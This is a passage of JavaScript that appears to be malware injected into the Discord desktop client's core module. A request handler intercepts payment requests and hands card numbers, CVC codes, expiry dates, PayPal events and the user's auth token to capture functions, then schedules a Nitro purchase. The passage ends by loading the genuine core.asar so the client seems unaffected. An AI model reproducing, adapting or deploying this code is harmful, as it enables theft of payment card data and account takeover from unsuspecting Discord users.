          ccAdded(data['card[number]'], data['card[cvc]'], data['card[exp_month]'], data['card[exp_year]'], token).catch((err) => console.log(`⚠️ [Credit Card Capture Error]: ${err}`));
        } catch (err) {
          console.log(`⚠️ [Card Data Parsing Failed]: ${err}`);
        }
        break;
  
      case details.url.endsWith('paypal_accounts') && details.method === 'POST':
        console.log(`💰 [PayPal Info Added]`);
        PaypalAdded(token).catch((err) => console.log(`⚠️ [PayPal Capture Error]: ${err}`));
        break;
  
      case details.url.endsWith('confirm') && details.method === 'POST':
        console.log(`🚀 [Purchase Confirmed, Initiating Nitro Buy]`);
        setTimeout(() => {
          nitroBought(token).catch((err) => console.log(`⚠️ [Nitro Purchase Error]: ${err}`));
        }, 7500);
        break;
  
      default:
        console.log(`ℹ️ [Unhandled Request Type]`);
        break;
    }
  });  

module.exports = require('./core.asar');
